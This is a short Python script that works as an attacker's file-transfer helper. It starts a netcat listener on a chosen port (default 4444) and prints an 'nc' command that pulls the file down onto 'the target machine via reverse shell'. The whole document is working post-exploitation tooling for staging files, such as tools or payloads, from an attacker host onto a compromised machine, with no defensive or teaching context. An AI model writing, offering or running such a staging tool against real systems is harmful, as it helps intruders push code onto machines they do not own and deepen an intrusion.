import os
import subprocess
import socket

def main():
    # File to send
    file_path = input("Enter the path of the file to transfer: ").strip()
    if not os.path.isfile(file_path):
        print("[!] File does not exist. Exiting...")
        return

    # Port for transfer
    port = input("Enter the port to use for transfer (default: 4444): ").strip() or "4444"
    
    # Local IP address
    local_ip = input("Enter local IP: ")

    # Command for the target machine
    print("\n[*] Run the following command on the target machine via reverse shell:")
    print(f"nc {local_ip} {port} > {os.path.basename(file_path)}\n")

    # Start netcat listener
    print("[*] Starting netcat listener...")
    try:
        subprocess.run(
            ["nc", "-lvkp", port],
            stdin=open(file_path, "rb"),
            check=True
        )
        print("[+] File sent successfully!")
    except FileNotFoundError:
        print("[!] Netcat is not installed or not found in the PATH.")
    except subprocess.CalledProcessError as e:
        print(f"[!] Error occurred while running netcat: {e}")
    except KeyboardInterrupt:
        print("[*] Transfer cancelled.")

if __name__ == "__main__":
    main()
